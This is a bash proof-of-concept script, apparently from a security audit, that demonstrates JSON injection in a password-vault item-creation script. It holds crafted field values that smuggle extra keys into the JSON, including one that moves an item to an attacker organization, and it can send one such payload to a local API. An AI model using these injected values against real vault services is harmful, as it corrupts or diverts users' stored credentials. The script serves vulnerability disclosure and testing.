#!/bin/bash
# ============================================================
# PoC #5 — JSON Injection via Unsanitized User Input (HIGH)
# Vulnerability: bin/add_item.sh:61–67
#
# User-supplied values are concatenated into a JSON payload without
# any escaping:
#
#   PAYLOAD='{ "type": 1, "name": "'"${SITE}"'"'
#   PAYLOAD+=',"login": {'
#   PAYLOAD+=' "username": "'"${USERNAME}"'"'
#   PAYLOAD+=',"password": "'"${PASSWORD}"'"'
#   PAYLOAD+=',"uris": [ { "match": null, "uri": "'"${URL}"'" } ]'
#   PAYLOAD+='} }'
#
# An attacker who controls any of these fields can inject arbitrary
# JSON, corrupting the vault item or injecting unexpected fields.
#
# This PoC demonstrates three injection scenarios:
#   A) Type-changing injection: password field overrides item type
#   B) Field-escaping injection via username to add hidden fields
#   C) Broken JSON → silent API failure (auth DoS for the item)
# ============================================================

API="${API:-http://localhost:8087}"

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }

# Reproduce the vulnerable payload builder from add_item.sh
build_payload() {
    local site="$1" username="$2" password="$3" url="$4" org_id="$5"

    local PAYLOAD
    PAYLOAD='{ "type": 1, "name": "'"${site}"'"'
    [ -n "${org_id}" ] && PAYLOAD+=',"organizationId": "'"${org_id}"'"'
    PAYLOAD+=',"login": {'
    PAYLOAD+=' "username": "'"${username}"'"'
    PAYLOAD+=',"password": "'"${password}"'"'
    PAYLOAD+=',"uris": [ { "match": null, "uri": "'"${url}"'" } ]'
    PAYLOAD+='} }'
    echo "${PAYLOAD}"
}

validate_json() {
    local payload="$1"
    if echo "${payload}" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
        echo "  [VALID JSON]"
    else
        echo "  [BROKEN JSON — parse error]"
    fi
}

send_payload() {
    local payload="$1"
    curl -s \
        -H 'Content-Type: application/json' \
        -d "${payload}" \
        "${API}/object/item" 2>/dev/null
}

# ---------- Part A: Type override via password field ----------
banner "Part A — Inject 'type' field via password (overrides item type)"

# The password field is placed BEFORE the closing brace.
# By injecting a closing brace and new keys, we can add top-level fields.
#
# Normal:   {..., "login": {"password": "VALUE",...}}
# Injected: {..., "login": {"password": ""}, "type": 2, "notes": "injected", "x": "...}}
#

MALICIOUS_PASSWORD='", "x": "' # minimal injection to add a field after login closes
# More impactful:
MALICIOUS_PASSWORD_B='PWVAL"}, "type": 2, "notes": "INJECTED_NOTE", "ignore": "'

info "Normal password:   hunter2"
NORMAL_PAYLOAD=$(build_payload "TestSite" "user@test.com" "hunter2" "https://test.com" "")
echo "  Payload: ${NORMAL_PAYLOAD}"
validate_json "${NORMAL_PAYLOAD}"
echo

info "Injected password: ${MALICIOUS_PASSWORD_B}"
INJECTED_PAYLOAD=$(build_payload "TestSite" "user@test.com" "${MALICIOUS_PASSWORD_B}" "https://test.com" "")
echo "  Payload: ${INJECTED_PAYLOAD}"
validate_json "${INJECTED_PAYLOAD}"

echo
echo "  The injected payload changes \"type\" from 1 (Login) to 2 (Secure Note)"
echo "  and adds a \"notes\" field — both at the top level of the item."
echo "  This corrupts the vault item structure beyond the intended fields."

if curl -s --connect-timeout 2 "${API}/status" > /dev/null 2>&1; then
    echo
    info "Sending injected payload to live API..."
    RESP=$(send_payload "${INJECTED_PAYLOAD}")
    ok "API response: ${RESP}"
    # Clean up if item was created
    NEW_ID=$(echo "${RESP}" | python3 -c \
        "import sys,json; print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)
    [ -n "${NEW_ID}" ] && curl -s -X DELETE "${API}/object/item/${NEW_ID}" > /dev/null
fi

# ---------- Part B: Injection via username field ----------
banner "Part B — Inject 'favorite' flag via username field"

MALICIOUS_USERNAME='admin@corp.com", "x_injected": "via_username", "favorite": true, "ignore": "'

info "Injected username: ${MALICIOUS_USERNAME}"
INJECTED_USERNAME_PAYLOAD=$(build_payload "CorpSite" "${MALICIOUS_USERNAME}" "password123" "https://corp.com" "")
echo "  Payload: ${INJECTED_USERNAME_PAYLOAD}"
validate_json "${INJECTED_USERNAME_PAYLOAD}"
echo
echo "  The item is created with 'favorite: true' even though the user"
echo "  only intended to set a username.  Any JSON field is injectable here."

# ---------- Part C: Site name injection that breaks JSON ----------
banner "Part C — Broken JSON via site name (silent failure)"

MALICIOUS_SITE='My "Site"'

info "Site name: ${MALICIOUS_SITE}"
BROKEN_PAYLOAD=$(build_payload "${MALICIOUS_SITE}" "user" "pass" "https://example.com" "")
echo "  Payload: ${BROKEN_PAYLOAD}"
validate_json "${BROKEN_PAYLOAD}"
echo
echo "  A site name with a double-quote produces invalid JSON."
echo "  The API call fails silently — the user sees 'Added ... Success: false'"
echo "  with no indication of what went wrong, and the item is not saved."

# ---------- Part D: URL injection ----------
banner "Part D — Inject fields via URL"

MALICIOUS_URL='https://evil.com"]}}, "organizationId": "ATTACKER_ORG_ID", "ignore": "'

info "Injected URL: ${MALICIOUS_URL}"
INJECTED_URL_PAYLOAD=$(build_payload "EvilSite" "victim" "password" "${MALICIOUS_URL}" "")
echo "  Payload: ${INJECTED_URL_PAYLOAD}"
validate_json "${INJECTED_URL_PAYLOAD}"
echo
echo "  By injecting into the URL field, the attacker can override top-level"
echo "  fields such as 'organizationId', moving the item to a different vault."
